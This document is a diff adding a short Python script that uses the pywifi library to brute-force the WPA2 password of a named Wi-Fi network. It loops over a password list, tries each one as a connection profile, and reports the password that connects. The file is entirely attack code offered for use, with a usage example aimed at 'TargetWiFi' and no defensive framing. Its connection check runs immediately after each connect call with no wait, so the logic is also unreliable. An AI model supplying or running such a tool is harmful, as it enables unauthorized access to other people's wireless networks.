@@ -1,0 +1,35 @@
+import itertools
+import pywifi
+from pywifi import const
+
+def crack_wifi_password(ssid, password_list):
+    wifi = pywifi.PyWiFi()  # Create an instance of the PyWiFi class
+    iface = wifi.interfaces()[0]  # Get the first wireless interface
+
+    iface.disconnect()  # Disconnect from any existing connections
+
+    profile = pywifi.Profile()  # Create a new wireless profile
+    profile.ssid = ssid  # Set the SSID of the target network
+    profile.auth = const.AUTH_ALG_OPEN  # Set the authentication algorithm to open
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # Set the key management type to WPA2-PSK
+
+    # Start brute force attack
+    for password in password_list:
+        profile.key = password  # Set the password
+
+        iface.remove_all_network_profiles()  # Remove any existing profiles
+        tmp_profile = iface.add_network_profile(profile)  # Add the new profile
+
+        iface.connect(tmp_profile)  # Connect to the network
+
+        if iface.status() == const.IFACE_CONNECTED:  # Check if connection is successful
+            return f"WiFi password cracked! Password: {password}"
+
+    return "Unable to crack WiFi password."
+
+# Usage example
+ssid = "TargetWiFi"
+password_list = ["password1", "password2", "password3"]  # Add more passwords to the list
+
+result = crack_wifi_password(ssid, password_list)
+print(result)
